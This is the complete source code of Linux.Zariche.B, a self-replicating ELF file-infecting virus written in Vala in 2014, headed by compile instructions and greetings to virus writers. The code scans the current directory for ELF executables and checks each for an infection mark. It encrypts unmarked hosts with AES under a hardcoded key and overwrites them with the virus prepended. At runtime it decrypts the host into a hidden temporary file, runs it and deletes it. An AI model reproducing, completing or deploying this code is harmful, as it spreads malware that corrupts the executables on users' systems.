/*
* Linux.Zariche - This is a POC ELF (x86_64) file prepender written in Vala by TMZ (2013/2014).
* It is probably the first virus ever in this language, which is pretty cool.
*
* Use at your own risk, I'm not responsible for any damages that this may cause.
* I bet this can be written in a much better way but I'm busy with other stuff in my life at the moment and the LIP had a deadline, sorry.
*
* Linux.Zariche.A - simple virus (prepender)
* Linux.Zariche.B (this) - prepender that encrypts the host with AES and decrypts it at runtime (December 2014)
*
* Compile with: valac filename.vala --pkg=gee-1.0 --pkg=gio-2.0 --pkg=nettle --pkg=posix (where vala >= 0.20)
* Note that it depends on the Nettle VAPI file that you can find here: http://pastebin.com/PNJ9W2TT
*
* Note that you should get a lot of warnings because I have not used try & catch where I should have to. This will be fixed in the future.
*
* A big shout for those who keeps the scene alive: herm1t, Genetix, SPTH, alcopaul, R3s1stanc3, SmashGuy and many others :)
*
* Feel free to contact me: tmz@null.net
*/

using Gee;

uint8[] virbytes;
uint8[] hostbytes;
uint8[] allbytes;
uint8[] tempbytes;
string etag_out;
string etag_outhost;
size_t bytes_written;


extern void exit(int exit_code);

bool isELF(string f) {

          uint32 ELF_signature = 0x464c457f; //0x464c457f means ".ELF"

          var file = File.new_for_path(f); //create the file variable
          var file_stream = file.read(); //reading the file into a stream

          var data_stream = new DataInputStream(file_stream); //creating a data stream with the data read from the file
          data_stream.set_byte_order(DataStreamByteOrder.LITTLE_ENDIAN); //byte order = little endian

          uint32 signature = data_stream.read_uint32(); //defines a signature variable - uint 32bits

            //check if is a valid ELF file by it's signature
          if (signature == ELF_signature) {
                return true; //OMG it's an ELF!
          }
          else
                return false; //dafuq bro, this is no ELF!
}

bool CheckMark(string f) { //thanks to slek

            uint8[] buf;
            string tag;

            var file = File.new_for_path(f); //opens file
            file.load_contents (null, out buf, out tag); //loads file into memory and returns a byte array with its content

            Bytes bytes = new Bytes(buf); //create a byte var based in the above array
            size_t size = bytes.get_size(); //get the size of the bytes

            string _mark = "=TMZ="; //infection mark

            for (int x = 1; x < size; ++x)
            {
                if (buf[x] == _mark[0])
                {
                    int y;
                    for (y = 1; y < _mark.length; ++y)
                    {
                        if ((x + y) >= size)
                            break;
                        if (buf[x + y] != _mark[y])
                            break;
                    }

                    if (y == _mark.length)
                    {
                        return true; //infected!
                    }
                }
            }
            return false; //not infected
}


int GetSize(string f) {
	
	var file = File.new_for_path(f);
	file.load_contents(null, out tempbytes, out etag_outhost); //load host bytes
	Bytes bytes = new Bytes(tempbytes); //load all bytes a.k.a virus + host
	int size = bytes.length; //get full elf size

	return size;

}	


void Infect(string f) {


    	var file = File.new_for_path(f);
	file.load_contents(null, out hostbytes, out etag_outhost); //load host bytes

	FileIOStream ios = file.open_readwrite(); //open host for writting

	FileOutputStream os = ios.output_stream as FileOutputStream; //sets an output stream

	os.seek (0, SeekType.SET); //make sure we are at the beggining of the file
	uint8[] key = "abcdefghijklmnop".data; //16bit key
	uint8[] iv = "0123456789101112".data; //16bit iv
	uint8[] hostbytes_aes = aes_enc(key, iv, hostbytes);
	
	os.write_all(virbytes, out bytes_written); //write virus bytes to position 0 (prepender)
	os.write_all(hostbytes_aes, out bytes_written); //write host bytes right after virus ending


}

void RunHost(string current) {

	int random = Random.int_range(1, 100);

	string hostbytes = ".hostbytes" + random.to_string(); //hidden file with random pattern in name

	var host = File.new_for_path(hostbytes); //create empty hidden hostfile
	var host_created = host.create(FileCreateFlags.NONE);

	var infected_file = File.new_for_path(current); //get contents of whole file (virus + host)
	infected_file.load_contents (null, out allbytes, out etag_out);

	FileStream stream = FileStream.open(infected_file.get_path(), "r"); //open current file for reading
	assert(stream != null);
	
	int sizeall = GetSize(infected_file.get_path());

	int hostsize = sizeall - 38727; //host size must be the full elf size - 11111 (virus size)

	stream.seek(38727, FileSeek.SET); //set stream to the begin of the host bytes

	// load content:
	uint8[] buf_aes = new uint8[hostsize]; //read host content into a byte buffer
	size_t read = stream.read(buf_aes, 1);
	assert (hostsize == read); //keep reading byte per byte until it finishes the entire file

	uint8[] key = "abcdefghijklmnop".data;
	uint8[] iv = "0123456789101112".data;
	uint8[] buf = aes_dec(key, iv, buf_aes);

	var dos = new DataOutputStream(host_created); //write read buffer to new file with only the host code 
	dos.write_all(buf, out bytes_written);
	stream.flush(); // make sure data is written to our file
	dos.close();

	GLib.FileUtils.chmod(hostbytes, 0755); //give the host file exec permission

	try {
       		Process.spawn_command_line_async("./" + hostbytes); //run the host file and waits for it to finish to return here
   	} 
	catch (SpawnError e) {
        	stderr.printf ("%s\n", e.message); //there is no room for errors here!
    	}
	
	try {
		host.delete (); //delete the hidden host file after its execution
	}
	catch (Error e) {
		stdout.printf ("Error: %s\n", e.message);
	}


}

public uint8[] aes_enc(uint8[] key, uint8[] iv, uint8[] data)
	{
		return_if_fail(iv.length == Nettle.AES_BLOCK_SIZE);
		
		// nettle overrites the iv, so make a copy
		uint8[] iv_copy = {};
		iv_copy.resize(iv.length);
		Posix.memcpy(iv_copy, iv, iv.length);
		
		var encrypt_part = data.length / Nettle.AES_BLOCK_SIZE;
		encrypt_part *= Nettle.AES_BLOCK_SIZE;
		
		var aes = Nettle.AES();
		aes.set_encrypt_key(key.length, key);
		uint8[] result = {};
		result.resize(data.length);

		Nettle.cbc_encrypt(&aes, aes.encrypt, Nettle.AES_BLOCK_SIZE, iv_copy, encrypt_part, result, data);
		
		if (encrypt_part != data.length)
			Posix.memcpy(&result[encrypt_part], &data[encrypt_part], data.length - encrypt_part);
		
		return result;
	}

public uint8[] aes_dec(uint8[] key, uint8[] iv, uint8[] data)
	{
		return_if_fail(iv.length == Nettle.AES_BLOCK_SIZE);
		
		// nettle overrites the iv, so make a copy
		uint8[] iv_copy = {};
		iv_copy.resize(iv.length);
		Posix.memcpy(iv_copy, iv, iv.length);
		
		var decrypt_part = data.length / Nettle.AES_BLOCK_SIZE;
		decrypt_part *= Nettle.AES_BLOCK_SIZE;
		
		var aes = Nettle.AES();
		aes.set_decrypt_key(key.length, key);
		uint8[] result = {};
		result.resize(data.length);

		Nettle.cbc_decrypt(&aes, aes.decrypt, Nettle.AES_BLOCK_SIZE, iv_copy, decrypt_part, result, data);
		
		if (decrypt_part != data.length)
			Posix.memcpy(&result[decrypt_part], &data[decrypt_part], data.length - decrypt_part);
		
		return result;
	}



int main(string[] args) {

        int i = 0; //file counter
        bool marked;
	string virName = GLib.Path.get_basename(args[0]); //get virus basename

	var file = File.new_for_path(virName);
	file.load_contents(null, out virbytes, out etag_out); //load virus bytes
	
	int virsize = GetSize(file.get_path());	

        var list = new ArrayList<string>(); //creates a list

        var directory = File.new_for_path("."); //create a variable for the current directory

        var enumerator = directory.enumerate_children(FileAttribute.STANDARD_NAME, 0); //enum by file name

        FileInfo file_info; //file info variable
        while ((file_info = enumerator.next_file()) != null) { //check all the files in folder

                if(isELF(file_info.get_name())) { //if ELF

                        list.add(file_info.get_name()); //add to list
                        i++; //increase counter

                }
           }
	list.remove(virName); //removes current file from list to prevent issues

        if(i > 0) { //if we have ELF files in folder
               foreach(string s in list) { //for every ELF file in list
                               marked = CheckMark(s); //check if is already marked a.k.a. infected
                                    if(!marked) {
                                            Infect(s); //if file is not marked, infect
                                        }
                    }
        }

	if(virsize > 38727) { //if current file size is bigger than the virus itself, its an infected file
		RunHost(virName); //so we run only the host code now
	}
	else {
		exit(0); //smell ya later!
	}


    return 0;
}

